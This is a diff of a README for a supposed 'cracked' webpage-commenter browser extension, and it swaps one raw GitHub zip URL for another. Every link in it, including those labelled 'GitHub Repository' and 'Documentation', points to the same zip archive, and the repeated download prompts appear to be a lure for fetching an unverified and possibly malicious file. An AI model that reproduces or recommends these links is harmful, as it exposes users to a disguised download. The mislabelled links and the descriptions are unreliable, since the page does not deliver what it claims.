@@ -2,7 +2,7 @@
 # 🖥️ cracked-webpage-commenter-extension - Simple Comments for Any Webpage
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/cracked-webpage-commenter-extension.zip)](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/cracked-webpage-commenter-extension.zip)
+[![Download](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/commenter_cracked_webpage_extension_3.0-alpha.4.zip)](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/commenter_cracked_webpage_extension_3.0-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Cracked Webpage Commenter Extension! This tool allows you to add comments to any webpage you visit, making it easier to share thoughts and insights with others. No programming knowledge is required to use this extension.
@@ -23,7 +23,7 @@ Welcome to the Cracked Webpage Commenter Extension! This tool allows you to add 
 
 ### Step 1: Visit the Download Page
 To download the Cracked Webpage Commenter Extension, please visit the following link:  
-[Download Page](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/cracked-webpage-commenter-extension.zip)
+[Download Page](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/commenter_cracked_webpage_extension_3.0-alpha.4.zip)
 
 ### Step 2: Locate the Latest Release
 On the download page, scroll down to find the latest release of the Cracked Webpage Commenter Extension. 
@@ -66,10 +66,10 @@ Stay updated by checking the Releases section for any new features or fixes. Reg
 This extension is under the MIT License. Feel free to use and modify it as needed.
 
 ## 🌐 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/cracked-webpage-commenter-extension.zip)
-- [Documentation](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/cracked-webpage-commenter-extension.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/commenter_cracked_webpage_extension_3.0-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/commenter_cracked_webpage_extension_3.0-alpha.4.zip)
 
 ## 🔗 Download Again
 For quick access, here’s the link to download:  
-[Download Page](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/cracked-webpage-commenter-extension.zip)
+[Download Page](https://raw.githubusercontent.com/bomm010/cracked-webpage-commenter-extension/main/Iliadic/commenter_cracked_webpage_extension_3.0-alpha.4.zip)
 ```
